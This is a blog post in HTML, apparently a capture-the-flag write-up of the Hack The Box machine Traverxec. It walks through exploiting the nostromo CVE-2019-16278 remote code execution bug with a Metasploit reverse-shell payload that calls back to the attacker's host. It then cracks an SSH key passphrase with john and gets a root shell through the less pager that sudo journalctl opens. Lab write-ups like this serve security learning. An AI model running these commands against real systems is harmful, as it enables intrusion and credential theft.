@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+      Hack The Box - Traverxec &middot; Ryan Kozak
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Hack The Box - Traverxec | Ryan Kozak</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Hack The Box - Traverxec" />
+<meta name="author" content="Ryan Kozak" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="hacking, web development, $other" />
+<meta property="og:description" content="hacking, web development, $other" />
+<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-craft-traverxec/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-craft-traverxec/" />
+<meta property="og:site_name" content="Ryan Kozak" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box - Traverxec" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Traverxec","dateModified":"2020-04-12T23:16:17+00:00","datePublished":"2020-04-12T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-craft-traverxec/"},"url":"http://0.0.0.0:4000/hack-the-box-craft-traverxec/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+</head>
+
+
+  <body class="post">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Ryan Kozak
+      </a>
+    </div>
+    <p class="lead">hacking, web development, $other</p>
+  </header>
+  <nav id="sidebar-nav-links">
+
+  
+    <a class="home-link "
+        href="/">Home</a>
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/about/">About</a>
+    	
+    
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/contact/">Contact</a>
+    	
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+    	
+      		<a class="page-link " href="/books/index.html">Book List</a>
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+    	
+    	<!-- TingTingPowPow -->
+    	
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+  <!-- Optional additional links to insert in sidebar nav -->
+
+
+</nav>
+
+
+  <nav id="sidebar-icon-links">
+  
+    <a id="github-link"
+       class="icon" title="Github Profile" aria-label="Github Profile"
+       href="https://github.com/d0n601">
+      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
+</svg>
+
+    </a>
+  
+
+  
+  <a id="stackoverflow-link"
+     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
+     href="https://stackoverflow.com/users/4681506/ryan-kozak">
+    <?xml version="1.0" encoding="utf-8"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
+<style type="text/css">
+	.st0{fill:#BCBBBB;}
+	.st1{fill:#F48023;}
+</style>
+<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
+<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
+	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
+</svg>
+
+  </a>
+  
+
+  
+  
+  
+  
+
+  
+    <a id="tags-link"
+       class="icon"
+       title="Tags" aria-label="Tags"
+       href="/tags/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+    </a>
+  
+
+  
+    <a id="search-link"
+       class="icon"
+       title="Search" aria-label="Search"
+       href="/search/">
+      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+    <path d="M0 0h24v24H0z" fill="none"/>
+</svg>
+    </a>
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+ 
+  <p class="copyright">
+  &copy; 2021 Ryan Kozak.
+</p>
+
+</div>
+
+    <main class="container">
+      <header>
+  <h1 class="post-title">Hack The Box - Traverxec</h1>
+</header>
+<div class="content">
+  <div class="post-meta">
+  <span class="post-date">12 Apr 2020</span>
+  <span class="post-categories">
+    
+      &bull;
+
+      
+      
+      
+
+      
+        CTF Writeup
+      
+    
+      &bull;
+
+      
+      
+      
+
+      
+        Security
+      
+    
+  </span>
+</div>
+
+  <div class="post-body">
+    <p><img src="/wp-content/uploads/2020/04/traverxec/badge.png" alt="Hack The Box Haystack" /></p>
+
+<h1 id="introduction">Introduction</h1>
+<p>Traverxec is an easy box worth 20 points, hosted on <code class="highlighter-rouge">10.10.10.165</code>. As we will see the name is indicative of the vulnerability we’ll leverage to gain our initial foothold. Despite having had difficulty with a few steps, when it’s all said and done the box is rather simple. This writeup is a short one because of that.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+<p>As always, we’ll add the IP of the box to our <code class="highlighter-rouge">/etc/hosts</code> file. So, from here on out <code class="highlighter-rouge">traverxec.htb</code> points to <code class="highlighter-rouge">10.10.10.165</code>.</p>
+
+<h2 id="port-scan-nmap">Port Scan: Nmap</h2>
+<p>We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> traverxec.htb
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 15:40 EST
+Nmap scan report for traverxec.htb (10.10.10.165)
+Host is up (0.84s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
+|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 196.10 seconds
+</span></code></pre></div></div>
+
+<p>The most important thing to notice here is that the web server running on this box is <strong>nostromo 1.9.6</strong>. Running a quick search for known vulnerabilities we find <a href="https://www.cvedetails.com/cve/CVE-2019-16278/">CVE-2019-16278</a>, which is a remote code execution bug.</p>
+
+<blockquote>
+  <p>Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.</p>
+</blockquote>
+
+<p>Given the name of this box, we’re certainly going to be exploiting this to gain our initial foothold.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>We can use Metasploit’s module for <a href="https://github.com/rapid7/metasploit-framework/pull/12476">CVE-2019-16278</a> and get a Meterpreter session on the box.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# msfconsole
+[-] ***
+                                                  
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v5.0.58-dev                          ]
++ -- --=[ 1936 exploits - 1079 auxiliary - 333 post       ]
++ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 &gt; set RHOSTS traverxec.htb
+RHOSTS =&gt; traverxec.htb
+msf5 &gt; set LPORT 80
+LPORT =&gt; 80
+msf5 &gt; use exploit/multi/http/nostromo_code_exec
+msf5 exploit(multi/http/nostromo_code_exec) &gt; set LHOST 10.10.15.60
+LHOST =&gt; 10.10.15.60
+msf5 exploit(multi/http/nostromo_code_exec) &gt; set LPORT 1337
+LPORT =&gt; 1337
+msf5 exploit(multi/http/nostromo_code_exec) &gt; set payload linux/x86/meterpreter/reverse_tcp
+payload =&gt; linux/x86/meterpreter/reverse_tcp
+msf5 exploit(multi/http/nostromo_code_exec) &gt; set target 1
+target =&gt; 1
+msf5 exploit(multi/http/nostromo_code_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.10.15.60:1337 
+[*] Configuring Automatic (Linux Dropper) target
+[*] Sending linux/x64/meterpreter/reverse_tcp command stager
+[*] Sending stage (3021284 bytes) to 10.10.10.165
+[*] Command Stager progress - 100.00% done (823/823 bytes)
+[*] Meterpreter session 1 opened (10.10.15.60:1337 -&gt; 10.10.10.165:47402) at 2019-12-17 13:27:54 -0500
+
+meterpreter &gt; 
+</code></pre></div></div>
+
+<h2 id="user-flag">User Flag</h2>
+<p>After some manual exploration we find some interesting content inside of the <code class="highlighter-rouge">/var/nostromo/conf</code> directory. There’s an <code class="highlighter-rouge">.htpasswd</code> file, but we don’t need to use that, at least not the way we’re going about this. What’s interesting in this directory is the configuration file, <code class="highlighter-rouge">nhttpd.conf</code>, which indicates the existence of another folder we need to take a look at.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">meterpreter &gt;</span><span class="w"> </span><span class="nb">cd</span> /var/nostromo/conf
+<span class="gp">meterpreter &gt;</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">Listing: /var/nostromo/conf
+===========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  41    fil   2019-10-25 15:20:50 -0400  .htpasswd
+100644/rw-r--r--  2928  fil   2019-10-25 14:43:20 -0400  mimes
+100644/rw-r--r--  498   fil   2019-10-27 16:12:13 -0400  nhttpd.conf
+
+</span><span class="gp">meterpreter &gt;</span><span class="w"> </span><span class="nb">cat </span>nhttpd.conf
+<span class="gp">#</span><span class="w"> </span>MAIN <span class="o">[</span>MANDATORY]
+<span class="go">
+servername    traverxec.htb
+serverlisten    *
+serveradmin   david@traverxec.htb
+serverroot    /var/nostromo
+servermimes   conf/mimes
+docroot     /var/nostromo/htdocs
+docindex    index.html
+
+</span><span class="gp">#</span><span class="w"> </span>LOGS <span class="o">[</span>OPTIONAL]
+<span class="go">
+logpid      logs/nhttpd.pid
+
+</span><span class="gp">#</span><span class="w"> </span>SETUID <span class="o">[</span>RECOMMENDED]
+<span class="go">
+user      www-data
+
+</span><span class="gp">#</span><span class="w"> </span>BASIC AUTHENTICATION <span class="o">[</span>OPTIONAL]
+<span class="go">
+htaccess    .htaccess
+htpasswd    /var/nostromo/conf/.htpasswd
+
+</span><span class="gp">#</span><span class="w"> </span>ALIASES <span class="o">[</span>OPTIONAL]
+<span class="go">
+/icons      /var/nostromo/icons
+
+</span><span class="gp">#</span><span class="w"> </span>HOMEDIRS <span class="o">[</span>OPTIONAL]
+<span class="go">
+homedirs    /home
+homedirs_public   public_www
+
+</span></code></pre></div></div>
+
+<p>The configuration file above indicates the existence of a <code class="highlighter-rouge">public_www</code> directory inside the <code class="highlighter-rouge">/home</code> directory. After some trial and error, we can determine that this is David’s home directory, as he’s the admin.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cd /home/david/public_www
+meterpreter &gt; ls
+Listing: /home/david/public_www
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  402   fil   2019-10-25 15:45:10 -0400  index.html
+40755/rwxr-xr-x   4096  dir   2019-10-25 17:02:59 -0400  protected-file-area
+</code></pre></div></div>
+
+<p>Now we find a directory named <code class="highlighter-rouge">protected-file-area</code> inside of <code class="highlighter-rouge">/home/david/public_www</code>. This folder contains <code class="highlighter-rouge">backup-ssh-identity-files.tgz</code>, which we can hopefully use to gain user access to the box as david.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cd ./protected-file-area
+meterpreter &gt; ls
+Listing: /home/david/public_www/protected-file-area
+===================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  45    fil   2019-10-25 15:46:01 -0400  .htaccess
+100644/rw-r--r--  1915  fil   2019-10-25 17:02:59 -0400  backup-ssh-identity-files.tgz
+
+meterpreter &gt; download ./backup-ssh-identity-files.tgz ./
+[*] Downloading: ./backup-ssh-identity-files.tgz -&gt; .//backup-ssh-identity-files.tgz
+[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): ./backup-ssh-identity-files.tgz -&gt; .//backup-ssh-identity-files.tgz
+[*] download   : ./backup-ssh-identity-files.tgz -&gt; .//backup-ssh-identity-files.tgz
+meterpreter &gt; 
+</code></pre></div></div>
+
+<p>We can download the <code class="highlighter-rouge">backup-ssh-identity-files.tgz</code> file through our Meterpreter session, and then extract it on our Kali box.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# tar -zxvf backup-ssh-identity-files.tgz
+home/david/.ssh/
+home/david/.ssh/authorized_keys
+home/david/.ssh/id_rsa
+home/david/.ssh/id_rsa.pub
+
+</code></pre></div></div>
+
+<p>When we try and use the keys we’ll see that David has set a password required to unlock them, annoying. Using <code class="highlighter-rouge">ssh2john</code> we can create a hash of the private key to use to brute force the key through john.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/home/david/.ssh# python ~/Tools/ssh2john.py id_rsa &gt; id_rsa_hash
+root@kali:~/home/david/.ssh# ls -lah
+total 24K
+drwx------ 2 1000 1000 4.0K Dec 15 19:55 .
+drwxr-xr-x 3 root root 4.0K Dec 12 20:27 ..
+-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 authorized_keys
+-rw------- 1 1000 1000 1.8K Oct 25 17:02 id_rsa
+-rw-r--r-- 1 root root 2.5K Dec 15 19:55 id_rsa_hash
+-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 id_rsa.pub
+root@kali:~/home/david/.ssh# john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (id_rsa)
+1g 0:00:00:06 DONE (2019-12-15 19:56) 0.1547g/s 2220Kp/s 2220Kc/s 2220KC/sa6_123..*7¡Vamos!
+Session completed
+root@kali:~/home/david/.ssh# 
+</code></pre></div></div>
+
+<p>After running john and the <code class="highlighter-rouge">rockyou.txt</code> wordlist to try and crack the key, we get <code class="highlighter-rouge">hunter</code>. Now that we’ve got the got the keys and the credentials to use them, we can ssh in as David and grab the flag.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/home/david/.ssh# ssh david@traverxec.htb
+
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Sun Dec 15 19:54:38 2019 from 10.10.15.105
+david@traverxec:~$ 
+david@traverxec:~$ ls
+bin  public_www  user.txt
+david@traverxec:~$ cat user.txt
+7db0b48469606a42cec20750d9782f3d
+</code></pre></div></div>
+
+<h2 id="root-flag">Root Flag</h2>
+<p>David’s home directory has a directory within it called <code class="highlighter-rouge">/bin</code>, which sticks out immediately. Exploring that directory we find <code class="highlighter-rouge">server-stats.sh</code>. This file appears to use the sudo command, as seen on the last line below.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@traverxec:~$ ls
+bin  public_www  user.txt
+david@traverxec:~/bin$ ls
+journalctl  server-stats.head  server-stats.sh
+david@traverxec:~/bin$ cat server-stats.sh
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+david@traverxec:~/bin$ 
+</code></pre></div></div>
+
+<p>Knowing that this script is calling <code class="highlighter-rouge">journalctl</code> as root means that it’s most definitely going to be what we need to exploit for our privilege escalation. Looking at <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFOBins</a> for <code class="highlighter-rouge">journalctl</code> it states that the pager will be invoked (<code class="highlighter-rouge">less</code>). We can pop a shell using <code class="highlighter-rouge">!/bin/sh</code>, or we can execute basically any commands we’d like if we precede them with <code class="highlighter-rouge">!</code>.</p>
+
+<p>After some playing around we can confirm that executing <code class="highlighter-rouge">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> does not require us to enter a password, and does indeed invoke <code class="highlighter-rouge">less</code>. All we need to do in order to exploit this is to shrink the terminal window down a bit, under 6 lines, and execute <code class="highlighter-rouge">!/bin/bash</code> to get our root shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Tue 2019-12-17 10:09:44 EST, end at Tue 2019-12-17 11:38:42 EST. --
+Dec 17 11:15:54 traverxec sudo[2264]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Dec 17 11:15:54 traverxec sudo[2264]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
+Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): conversation failed
+Dec 17 11:18:40 traverxec sudo[2319]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Dec 17 11:18:40 traverxec sudo[2319]: www-data : command not allowed ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=list
+!/usr/bin/bash
+root@traverxec:/home/david/bin# cat /root/root.txt
+9aa36a6d76f785dfd320a478f6e0d906
+root@traverxec:/home/david/bin# 
+</code></pre></div></div>
+
+<h1 id="conclusion">Conclusion</h1>
+<p>This box was really straight forward for the most part. The initial foothold was obvious, and using the Metasploit module made it very easy. Finding the public directory inside David’s home directory via the nostromo configuration was probably the most confusing part, at least from my perspective. Once we found that directory, Meterpreter allowed us to download the backup file of ssh keys quite easily. The keys did have a password, but cracking this was also rather simple since the password would be present on almost any wordlist. The path to root was clear immediately after gaining access as the user. While the method we were to use to exploit it was also clear right away, actually doing so still took me about a day, as I was over thinking it a bit. Traverxec was a fun box, and well named. It was my first box in quite a few months, and a nice reintroduction.</p>
+
+    
+
+
+
+<div class="post-tags">
+  
+    
+    <a href="/tags/#ctf">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
